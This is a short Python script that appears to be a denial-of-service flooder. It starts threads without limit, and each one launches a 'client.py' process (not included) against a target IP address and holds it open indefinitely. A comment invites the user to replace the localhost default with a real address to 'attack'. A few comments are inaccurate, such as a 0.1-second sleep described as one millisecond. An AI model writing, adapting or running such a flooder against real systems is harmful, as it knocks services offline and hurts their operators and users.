import threading
import sys
import subprocess
import time
def main():
    ip = "127.0.0.1" #replace with valid ip address unless you really wana attack local host
    x = 0
    while True: 
        try:
            t = threading.Thread(target=connect,args=(ip,)) # start new thread for connect with arguments of ip address
            t.start()                                       # start thread  
            x+=1                                            # incriment thread count
        
        except:                                             # on any error 
            print(x)                                        # print number of threads
            return                                          # stop program



def connect(ip):   
     
    process = subprocess.Popen(
                        [sys.executable,"client.py"],   #run client.py in current environment 
                        stdin=subprocess.PIPE,          #pipe stdin
                        stdout=subprocess.PIPE,         #pipe stdout
                        stderr=subprocess.PIPE,         #pipe stderr
                        text=True,                      #enable the use of text
                        bufsize=1                       #buffer size =1
                        )
    
    time.sleep(0.1)                                     # wait 1 milisecond for client
    process.stdin.write(f"{str(ip)}\n")                 # write the ip address to sdtin
    process.stdin.flush()                               # force the buffer to client
    while True:                                         # go to sleep indefinetly
        time.sleep(3600)                                

main()